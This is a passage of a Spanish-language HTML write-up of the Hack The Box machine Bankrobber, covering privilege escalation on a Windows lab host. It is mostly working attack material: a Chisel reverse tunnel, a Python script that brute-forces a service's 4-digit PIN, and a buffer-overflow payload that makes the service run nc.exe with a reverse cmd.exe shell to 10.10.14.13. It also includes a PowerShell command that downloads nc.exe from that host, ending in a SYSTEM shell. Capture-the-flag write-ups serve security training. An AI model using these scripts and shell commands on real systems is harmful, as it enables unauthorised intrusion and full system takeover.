+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true"></a> Directory of C:\</span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true"></a></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true"></a>25-04-2019  16:50            57.<span class="fu">937</span> bankv2.<span class="fu">exe</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true"></a>24-04-2019  21:27    &lt;<span class="fu">DIR</span>&gt;          PerfLogs</span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true"></a>21-10-2022  10:32    &lt;<span class="fu">DIR</span>&gt;          Program Files</span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true"></a>21-10-2022  10:34    &lt;<span class="fu">DIR</span>&gt;          Program Files (x86)</span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true"></a>24-04-2019  15:52    &lt;<span class="fu">DIR</span>&gt;          Users</span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true"></a>11-01-2021  15:17    &lt;<span class="fu">DIR</span>&gt;          Windows</span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true"></a>24-04-2019  21:18    &lt;<span class="fu">DIR</span>&gt;          xampp</span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true"></a>               1 File(s)         57.<span class="fu">937</span> bytes</span>
+<span id="cb13-16"><a href="#cb13-16" aria-hidden="true"></a>               6 <span class="fu">Dir</span>(s)   5.<span class="fu">208</span>.<span class="fu">616</span>.<span class="fu">960</span> bytes free</span>
+<span id="cb13-17"><a href="#cb13-17" aria-hidden="true"></a></span>
+<span id="cb13-18"><a href="#cb13-18" aria-hidden="true"></a>C:\&gt;</span></code></pre></div>
+<p>Vemos que no tenemos acceso, al traducirlo, “Toegang geweigerd” es “Acceso denegado” en holandés.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a>bankv2.<span class="fu">exe</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a>bankv2.<span class="fu">exe</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true"></a>Toegang geweigerd.</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true"></a></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true"></a>C:\&gt;</span></code></pre></div>
+<p>Vemos que el binario está utilizando el puerto <strong>910</strong></p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a>tasklist | findstr bankv2.<span class="fu">exe</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a>tasklist | findstr bankv2.<span class="fu">exe</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a>bankv2.<span class="fu">exe</span>                    1652                            0        408 K</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true"></a></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true"></a>netstat -ano | findstr 1652</span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true"></a>netstat -ano | findstr 1652</span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true"></a>  TCP    0.<span class="fu">0</span>.<span class="fu">0</span>.<span class="fu">0</span>:910            0.<span class="fu">0</span>.<span class="fu">0</span>.<span class="fu">0</span>:0              LISTENING       1652</span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true"></a></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true"></a>C:\&gt;</span></code></pre></div>
+<p>Vamos a realizar un <strong>Remote Port Forwarding</strong> utilizando la herramienta <a href="https://github.com/jpillora/chisel">Chisel</a>.</p>
+<p><img src="Img/Pasted image 20250222210326.png"></p>
+<p><img src="Img/Pasted image 20250222210346.png"></p>
+<p>Ejecutamos el chisel como servidor en nuestra maquina.</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a>❯ <span class="ex">./chisel</span> server --reverse -p 8080</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a><span class="ex">2025/02/22</span> 20:52:49 server: Reverse tunnelling enabled</span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true"></a><span class="ex">2025/02/22</span> 20:52:49 server: Fingerprint /2JXC9JOW1crN1CBfW54FdSuk9OmDFJcBE8BxSOZ4qA=</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true"></a><span class="ex">2025/02/22</span> 20:52:49 server: Listening on http://0.0.0.0:8080</span></code></pre></div>
+<p>Aprovechando que tenemos el servidor SMB, ejecutamos el <strong>Chisel</strong> directamente, haciendo que el puerto <strong>910</strong> pase a ser nuestro puerto.</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a>\\10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">13</span>\pwn\chisel.<span class="fu">exe</span> client 10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">13</span>:8080 R:910:127.<span class="fu">0</span>.<span class="fu">0</span>.<span class="fu">1</span>:910</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a>\\10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">13</span>\pwn\chisel.<span class="fu">exe</span> client 10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">13</span>:8080 R:910:127.<span class="fu">0</span>.<span class="fu">0</span>.<span class="fu">1</span>:910</span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true"></a>2025/02/22 19:16:37 client: Connecting to ws://10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">13</span>:8080</span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true"></a>2025/02/22 19:16:45 client: Connected (Latency 553.<span class="fu">8256ms</span>)</span></code></pre></div>
+<p>Y recibimos el túnel en el servidor.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a>❯ <span class="ex">./chisel</span> server --reverse -p 8080</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a><span class="ex">2025/02/22</span> 20:52:49 server: Reverse tunnelling enabled</span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a><span class="ex">2025/02/22</span> 20:52:49 server: Fingerprint /2JXC9JOW1crN1CBfW54FdSuk9OmDFJcBE8BxSOZ4qA=</span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true"></a><span class="ex">2025/02/22</span> 20:52:49 server: Listening on http://0.0.0.0:8080</span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true"></a><span class="ex">2025/02/22</span> 21:09:55 server: session#1: tun: proxy#R:910=<span class="op">&gt;</span>910: Listening</span></code></pre></div>
+<p>ahora si nos conectamos por el puerto <strong>910</strong> podemos acceder al binario.</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> 127.0.0.1 910</span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true"></a> <span class="ex">Internet</span> E-Coin Transfer System</span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true"></a> <span class="ex">International</span> Bank of Sun church</span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true"></a>                                        <span class="ex">v0.1</span> by Gio <span class="kw">&amp;</span> <span class="ex">Cneeliz</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true"></a> <span class="ex">Please</span> enter your super secret 4 digit PIN code to login:</span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true"></a> [$] </span></code></pre></div>
+<p>Nos pide un PIN de 4 dígitos, si ponemos cualquiera por obvias razones nos deniega el acceso.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> 127.0.0.1 910</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true"></a> <span class="ex">Internet</span> E-Coin Transfer System</span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true"></a> <span class="ex">International</span> Bank of Sun church</span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true"></a>                                        <span class="ex">v0.1</span> by Gio <span class="kw">&amp;</span> <span class="ex">Cneeliz</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true"></a> <span class="ex">Please</span> enter your super secret 4 digit PIN code to login:</span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true"></a> [$] <span class="ex">1234</span></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true"></a> [!] <span class="ex">Access</span> denied, disconnecting client....</span></code></pre></div>
+<p>Vamos a crear un script en <strong>python</strong> para realizar el ataque de fuerza bruta, y poder adivinar el PIN correcto.</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python3  </span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> log, socket  </span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true"></a><span class="im">import</span> time  </span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true"></a>  </span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true"></a><span class="kw">def</span> brutef():  </span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true"></a>  </span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true"></a>    p1 <span class="op">=</span> log.progress(<span class="st">&quot;Fuerza Bruta&quot;</span>)  </span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true"></a>  </span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true"></a>    p1.status(<span class="st">&quot;Iniciando ataque de fuerza bruta&quot;</span>)  </span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true"></a>  </span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true"></a>    time.sleep(<span class="dv">2</span>)  </span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true"></a>  </span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true"></a>    <span class="cf">for</span> pin <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">10000</span>):  </span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true"></a>  </span>
+<span id="cb21-15"><a href="#cb21-15" aria-hidden="true"></a>        pin <span class="op">=</span> <span class="bu">str</span>(pin).zfill(<span class="dv">4</span>)  </span>
+<span id="cb21-16"><a href="#cb21-16" aria-hidden="true"></a>  </span>
+<span id="cb21-17"><a href="#cb21-17" aria-hidden="true"></a>        p1.status(<span class="st">&quot;Probando con el PIN [</span><span class="sc">%s</span><span class="st">/9999]&quot;</span> <span class="op">%</span> pin)  </span>
+<span id="cb21-18"><a href="#cb21-18" aria-hidden="true"></a>  </span>
+<span id="cb21-19"><a href="#cb21-19" aria-hidden="true"></a>  </span>
+<span id="cb21-20"><a href="#cb21-20" aria-hidden="true"></a>        s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span>
+<span id="cb21-21"><a href="#cb21-21" aria-hidden="true"></a>        s.<span class="ex">connect</span>((<span class="st">&quot;127.0.0.1&quot;</span>, <span class="dv">910</span>))  </span>
+<span id="cb21-22"><a href="#cb21-22" aria-hidden="true"></a>  </span>
+<span id="cb21-23"><a href="#cb21-23" aria-hidden="true"></a>        data <span class="op">=</span> s.recv(<span class="dv">1024</span>)  </span>
+<span id="cb21-24"><a href="#cb21-24" aria-hidden="true"></a>  </span>
+<span id="cb21-25"><a href="#cb21-25" aria-hidden="true"></a>        s.send(pin.encode() <span class="op">+</span> b<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)  </span>
+<span id="cb21-26"><a href="#cb21-26" aria-hidden="true"></a>  </span>
+<span id="cb21-27"><a href="#cb21-27" aria-hidden="true"></a>        data <span class="op">=</span> s.recv(<span class="dv">1024</span>)  </span>
+<span id="cb21-28"><a href="#cb21-28" aria-hidden="true"></a>  </span>
+<span id="cb21-29"><a href="#cb21-29" aria-hidden="true"></a>        <span class="cf">if</span> <span class="st">&quot;Access denied&quot;</span> <span class="kw">not</span> <span class="kw">in</span> data.decode():  </span>
+<span id="cb21-30"><a href="#cb21-30" aria-hidden="true"></a>            p1.success(<span class="ss">f&quot;El PIN correcto es </span><span class="sc">{</span>pin<span class="sc">}</span><span class="ss">&quot;</span>)  </span>
+<span id="cb21-31"><a href="#cb21-31" aria-hidden="true"></a>            <span class="cf">break</span>  </span>
+<span id="cb21-32"><a href="#cb21-32" aria-hidden="true"></a>  </span>
+<span id="cb21-33"><a href="#cb21-33" aria-hidden="true"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:  </span>
+<span id="cb21-34"><a href="#cb21-34" aria-hidden="true"></a>    brutef()</span></code></pre></div>
+<p>Si lo ejecutamos, podemos averiguar ahora que el PIN correcto es <strong>0021</strong></p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a>❯ <span class="ex">python3</span> brutef.py</span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a>[<span class="ex">+</span>] Fuerza Bruta: El PIN correcto es 0021</span></code></pre></div>
+<p>Ahora al acceder al binario y poner el PIN correcto, nos pide una cantidad de e-coins para realizar cierta transferencia, y si nos fijamos vemos que tras poner un numero, ejecuta un binario.</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> 127.0.0.1 910</span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true"></a> <span class="ex">Internet</span> E-Coin Transfer System</span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true"></a> <span class="ex">International</span> Bank of Sun church</span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true"></a>                                        <span class="ex">v0.1</span> by Gio <span class="kw">&amp;</span> <span class="ex">Cneeliz</span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true"></a> <span class="ex">Please</span> enter your super secret 4 digit PIN code to login:</span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true"></a> [$] <span class="ex">0021</span></span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true"></a> [$] <span class="ex">PIN</span> is correct, access granted!</span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true"></a> <span class="ex">Please</span> enter the amount of e-coins you would like to transfer:</span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true"></a> [$] <span class="ex">123</span></span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true"></a> [$] <span class="ex">Transfering</span> <span class="va">$1</span>23 using our e-coin transfer application. </span>
+<span id="cb23-14"><a href="#cb23-14" aria-hidden="true"></a> [$] <span class="ex">Executing</span> e-coin transfer tool: C:\Users\admin\Documents\transfer.exe</span>
+<span id="cb23-15"><a href="#cb23-15" aria-hidden="true"></a></span>
+<span id="cb23-16"><a href="#cb23-16" aria-hidden="true"></a> [$] <span class="ex">Transaction</span> in progress, you can safely disconnect...</span></code></pre></div>
+<p>Al probar de poner varios caracteres, vemos que llega un punto en el que esos caracteres sobrescriben el espacio donde se supone que debería ir el binario, desbordando el nombre del ejecutable, ejecutando lo que hay.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> 127.0.0.1 910</span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true"></a> <span class="ex">Internet</span> E-Coin Transfer System</span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true"></a> <span class="ex">International</span> Bank of Sun church</span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true"></a>                                        <span class="ex">v0.1</span> by Gio <span class="kw">&amp;</span> <span class="ex">Cneeliz</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true"></a> <span class="ex">Please</span> enter your super secret 4 digit PIN code to login:</span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true"></a> [$] <span class="ex">0021</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true"></a> [$] <span class="ex">PIN</span> is correct, access granted!</span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true"></a> <span class="ex">Please</span> enter the amount of e-coins you would like to transfer:</span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true"></a> [$] <span class="ex">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span>
+<span id="cb24-13"><a href="#cb24-13" aria-hidden="true"></a> [$] <span class="ex">Transfering</span> <span class="va">$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span> using our e-coin transfer application. </span>
+<span id="cb24-14"><a href="#cb24-14" aria-hidden="true"></a> [$] <span class="ex">Executing</span> e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span id="cb24-15"><a href="#cb24-15" aria-hidden="true"></a></span>
+<span id="cb24-16"><a href="#cb24-16" aria-hidden="true"></a> [$] <span class="ex">Transaction</span> in progress, you can safely disconnect...</span></code></pre></div>
+<p>Vamos a generar un patrón, para saber la cantidad necesaria de caracteres que necesito, para llegar a sobrescribir ese espacio.</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a>❯ <span class="ex">msf-pattern_create</span> -l 50</span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true"></a><span class="ex">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</span></span></code></pre></div>
+<p>Enviamos el patrón.</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> 127.0.0.1 910</span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true"></a> <span class="ex">Internet</span> E-Coin Transfer System</span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true"></a> <span class="ex">International</span> Bank of Sun church</span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true"></a>                                        <span class="ex">v0.1</span> by Gio <span class="kw">&amp;</span> <span class="ex">Cneeliz</span></span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true"></a> <span class="ex">Please</span> enter your super secret 4 digit PIN code to login:</span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true"></a> [$] <span class="ex">0021</span></span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true"></a> [$] <span class="ex">PIN</span> is correct, access granted!</span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true"></a> <span class="ex">Please</span> enter the amount of e-coins you would like to transfer:</span>
+<span id="cb26-12"><a href="#cb26-12" aria-hidden="true"></a> [$] <span class="ex">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</span></span>
+<span id="cb26-13"><a href="#cb26-13" aria-hidden="true"></a> [$] <span class="ex">Transfering</span> <span class="va">$Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</span> using our e-coin transfer application. </span>
+<span id="cb26-14"><a href="#cb26-14" aria-hidden="true"></a> [$] <span class="ex">Executing</span> e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab</span>
+<span id="cb26-15"><a href="#cb26-15" aria-hidden="true"></a></span>
+<span id="cb26-16"><a href="#cb26-16" aria-hidden="true"></a> [$] <span class="ex">Transaction</span> in progress, you can safely disconnect...</span></code></pre></div>
+<p>Ahora cogemos los 4 primeros bytes, y así obtenemos el offset.</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true"></a>❯ <span class="ex">msf-pattern_create</span> -q 0Ab1</span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true"></a>[<span class="ex">*</span>] Exact match at offset 32</span></code></pre></div>
+<p>Vale, ahora que sabemos que necesitamos <strong>32</strong> caracteres, para antes de empezar a sobrescribir el espacio donde aparece el nombre del binario, crearemos un <strong>payload</strong> donde después de los 32 caracteres, ejecutara el binario <strong>nc.exe</strong> para enviarnos una shell.</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true"></a>❯ <span class="ex">python3</span> -c <span class="st">&quot;print(&#39;A&#39;*32 + &#39;C:</span><span class="dt">\\\\</span><span class="st">Users</span><span class="dt">\\\\</span><span class="st">Cortin</span><span class="dt">\\\\</span><span class="st">AppData</span><span class="dt">\\\\</span><span class="st">Local</span><span class="dt">\\\\</span><span class="st">Temp</span><span class="dt">\\\\</span><span class="st">nc.exe 10.10.14.13 999 -e cmd.exe&#39;)&quot;</span></span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true"></a><span class="ex">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC</span>:\Users\Cortin\AppData\Local\Temp\nc.exe 10.10.14.13 999 -e cmd.exe</span></code></pre></div>
+<p>Descargamos el <strong>nc.exe</strong> en la maquina Windows.</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true"></a>C:\&gt;powershell -c <span class="st">&quot;iwr http://10.10.14.13/nc.exe -outfile %temp%\nc.exe&quot;</span></span></code></pre></div>
+<p>Enviamos el payload mientras nos ponemos en escucha.</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> 127.0.0.1 910</span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true"></a> <span class="ex">Internet</span> E-Coin Transfer System</span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true"></a> <span class="ex">International</span> Bank of Sun church</span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true"></a>                                        <span class="ex">v0.1</span> by Gio <span class="kw">&amp;</span> <span class="ex">Cneeliz</span></span>
+<span id="cb30-6"><a href="#cb30-6" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb30-7"><a href="#cb30-7" aria-hidden="true"></a> <span class="ex">Please</span> enter your super secret 4 digit PIN code to login:</span>
+<span id="cb30-8"><a href="#cb30-8" aria-hidden="true"></a> [$] <span class="ex">0021</span></span>
+<span id="cb30-9"><a href="#cb30-9" aria-hidden="true"></a> [$] <span class="ex">PIN</span> is correct, access granted!</span>
+<span id="cb30-10"><a href="#cb30-10" aria-hidden="true"></a> <span class="ex">--------------------------------------------------------------</span></span>
+<span id="cb30-11"><a href="#cb30-11" aria-hidden="true"></a> <span class="ex">Please</span> enter the amount of e-coins you would like to transfer:</span>
+<span id="cb30-12"><a href="#cb30-12" aria-hidden="true"></a> [$] <span class="ex">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC</span>:\Users\Cortin\AppData\Local\Temp\nc.exe 10.10.14.13 999 -e cmd.exe</span>
+<span id="cb30-13"><a href="#cb30-13" aria-hidden="true"></a> [$] <span class="ex">Transfering</span> <span class="va">$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC</span>:\Users\Cortin\AppData\Local\Temp\nc.exe 10.10.14.13 999 -e cmd.exe using our e-coin transfer application. </span>
+<span id="cb30-14"><a href="#cb30-14" aria-hidden="true"></a> [$] <span class="ex">Executing</span> e-coin transfer tool: C:\Users\Cortin\AppData\Local\Temp\nc.exe 10.10.14.13 999 -e cmd.exe</span>
+<span id="cb30-15"><a href="#cb30-15" aria-hidden="true"></a></span>
+<span id="cb30-16"><a href="#cb30-16" aria-hidden="true"></a> [$] <span class="ex">Transaction</span> in progress, you can safely disconnect...</span></code></pre></div>
+<p>Y recibimos la shell como el usuario <strong>nt authority\system</strong>.</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true"></a>❯ rlwrap nc -lvnp 999</span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true"></a>listening on [any] 999 ...</span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true"></a>connect to [10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">13</span>] <span class="kw">from</span> (UNKNOWN) [10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">154</span>] 49764</span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true"></a>Microsoft Windows [Version 10.<span class="fu">0</span>.<span class="fu">14393</span>]</span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true"></a>(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.</span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true"></a></span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true"></a>whoami</span>
+<span id="cb31-8"><a href="#cb31-8" aria-hidden="true"></a>whoami</span>
+<span id="cb31-9"><a href="#cb31-9" aria-hidden="true"></a>nt authority\system</span>
+<span id="cb31-10"><a href="#cb31-10" aria-hidden="true"></a></span>
+<span id="cb31-11"><a href="#cb31-11" aria-hidden="true"></a>C:\Windows\system32&gt;</span></code></pre></div>
+<p>Pudiendo finalmente visualizar la ultima flag.</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true"></a><span class="fu">type</span> root.<span class="fu">txt</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true"></a><span class="fu">type</span> root.<span class="fu">txt</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true"></a>e58*****************************</span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true"></a></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true"></a>C:\Users\admin\Desktop&gt;</span></code></pre></div>
+
+
+
+<p>Aqui se explica con detalle el <a class="link" href="https://github.com/MrPr1ngl3s/AutoPWN/tree/main/HTB/Bankrobber" target="_blank">AutoPWN</a> de la máquina Bankrobber.</p>
+
+<hr />
+<p>© <script>document.write(new Date().getFullYear());</script> - Mr. Pr1ngl3s</p>
+
+  </div>
+</body>
+</html>
